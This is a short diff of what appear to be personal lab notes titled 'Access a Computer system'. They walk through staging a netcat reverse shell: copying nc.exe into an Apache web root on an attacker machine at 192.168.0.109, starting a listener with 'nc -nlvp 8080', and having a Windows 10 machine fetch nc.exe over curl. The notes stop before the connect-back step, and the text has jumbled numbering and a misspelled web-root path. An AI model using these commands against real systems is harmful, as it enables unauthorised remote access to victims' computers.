@@ -1,0 +1,21 @@
+1     Access a Computer system
+2
+3     ifconfig-my IP-192.168.0.109
+
+4     search curl shipped by Microsoft
+
+5     locate nc.exe
+
+6     sudo cp /usr/share/windows-resources/binaries/nc.exe   /var/ww/html/nc.exe
+
+7    sudo systemctl start apache2.service
+8    nc -nlvp 8080
+
+9
+10    In windows 10 PC-
+11
+12      cmd
+
+13     cd Desktop
+
+14     curl -o nc.exe http://192.168.0.109/nc.exe
